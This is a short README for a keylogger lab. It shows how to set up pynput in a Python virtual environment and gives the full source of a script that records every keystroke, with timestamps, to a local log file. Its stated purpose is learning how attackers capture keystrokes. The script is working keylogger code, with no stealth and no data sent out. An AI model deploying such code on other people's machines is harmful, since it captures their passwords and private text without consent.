# Keylogger-lab
Build a keylogger in Python to understand how attackers capture keystrokes.  

## Tools
 - Kali Linux
 - Pynput
 - Python

## Methodology
 ### 1. Install Python and Pynput  
  ```bash
# Install venv 
sudo apt install python3-venv

# Create a virtual environment
python3 -m venv ~/keylogger_demo/venv

# Activate it
source ~/keylogger_demo/venv/bin/activate

# Install pynput in the venv
pip install pynput

```
 ### 2 . Create a Keylogger Script
 - create a python file and paste the code.  
 
 ```bash
from pynput import keyboard
import logging

# Set up logging
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

 ### 3. Execute the keylogger
 ```bash
 python3 keylogger.py
 ```

 ### 4. View Logs
  ```bash
cat key_log.txt
  ```
